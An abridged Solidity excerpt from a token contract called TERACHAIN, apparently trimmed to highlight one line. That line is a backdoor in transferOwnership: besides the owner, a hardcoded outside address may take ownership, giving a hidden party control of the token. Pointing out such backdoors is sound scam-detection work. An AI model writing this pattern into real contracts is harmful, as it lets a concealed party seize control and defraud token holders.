...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xf991ADb15FecC57a8b9B42b74637f304e401F44C));
...
contract TERACHAIN is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 7000000 * 10**9;
  string private _symbol = "TCH";
  string private _name = "TERACHAIN";
